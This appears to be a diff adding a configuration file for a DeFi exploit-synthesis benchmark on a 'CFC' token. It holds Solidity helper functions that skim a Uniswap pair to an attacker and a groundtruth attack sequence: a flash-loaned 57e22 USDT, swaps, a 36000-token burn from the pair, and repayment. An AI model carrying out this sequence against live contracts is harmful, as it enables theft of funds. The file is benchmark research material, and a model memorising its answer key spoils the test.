@@ -1,0 +1,114 @@
+# Information for benchmarks building.
+project_name: "CFC"
+
+ctrt_name2cls:
+  - ["usdt", "USDT"]
+  - ["safe", "SAFE"]
+  - ["cfc", "CFC"]
+  - ["safeusdtPair", "UniswapV2Pair"]
+  - ["pair", "UniswapV2Pair"]
+  - ["usdtcfc", "USDTCFC"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["usdt", "new USDT()"]
+  - ["safe", "new SAFE()"]
+  - ["cfc", "new CFC(address(safe))"]
+  - ["usdtcfc", "new USDTCFC() "]
+  - ["safeusdtPair", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions: 
+  - "function burn_cfc_pair(uint256 amount) internal eurus {
+    cfc.transfer(address(pair), amount);
+    pair.skim(attacker);
+    amount /= 2;
+    cfc.transfer(address(pair), amount);
+    pair.skim(attacker); }"
+  - "function swap_usdtcfc_attacker_usdt_cfc(uint256 amount, uint256 amountOut) internal eurus {
+      usdt.transfer(address(safeusdtPair), amount);
+      safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
+      uint256 amountOfSafe = safe.balanceOf(attacker);
+      safe.transfer(address(pair), safe.balanceOf(attacker));
+      pair.swap(
+          1,
+          pair.getAmountOut(amountOfSafe, address(safe)),
+          attacker,
+          new bytes(0)
+      );   
+    }"
+  - "function swap_usdtcfc_attacker_cfc_usdt(uint256 amount, uint256 amountOut) internal eurus {
+      cfc.transfer(address(pair), amount);
+      pair.swap(amountOut, 0, attacker, new bytes(0));
+      uint256 amountOfSafe = safe.balanceOf(attacker);
+      safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
+      safeusdtPair.swap(
+          0,
+          safeusdtPair.getAmountOut(amountOfSafe, address(safe)),
+          attacker,
+          new bytes(0)
+      );  
+    }"
+
+
+extra_deployments:
+  - "cfc.afterDeploy(address(router), address(pair));"
+
+extra_statements:
+  - "vm.warp(blockTimestamp);
+    vm.roll(29668034);"
+
+attack_goal_str: "usdt"
+
+groundtruth:
+  - ["borrow", "usdt", "owner", "57 * 1e22"]
+  - ["swap", "usdtcfc", "attacker", "usdt", "cfc", "13 * 1e21", "safeusdtPair.getAmountOut(13 * 1e21, address(usdt))"]
+  - ["burn", "cfc", "pair", "36000 ether"]
+  - ["swap", "usdtcfc", "attacker", "cfc", "usdt", "cfc.balanceOf(attacker)", "pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8 / 10"]
+  - ["payback", "usdt", "owner", "57 * 1e22"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "safe":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "cfc":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "safeusdtPair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["safe", "usdt"]
+    support_swaps:
+      "safe": ["safe", "usdt"]
+      "bept": ["safe", "usdt"]
+    is_oracle: true
+    oracle: "pair"
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["safe", "cfc"]
+    support_swaps:
+      "safe": ["safe", "cfc"]
+      "cfc": ["safe", "cfc"]
+    is_oracle: true
+    oracle: "pair"
+  "usdtcfc":
+    is_swappair: true
+    token_pair: ["usdt", "cfc"]
+    support_swaps:
+      "usdt": ["usdt", "cfc"]
+      "cfc": ["usdt", "cfc"]
+    is_oracle: true
+    oracle: "pair"
+  
+pattern: "Token burn"
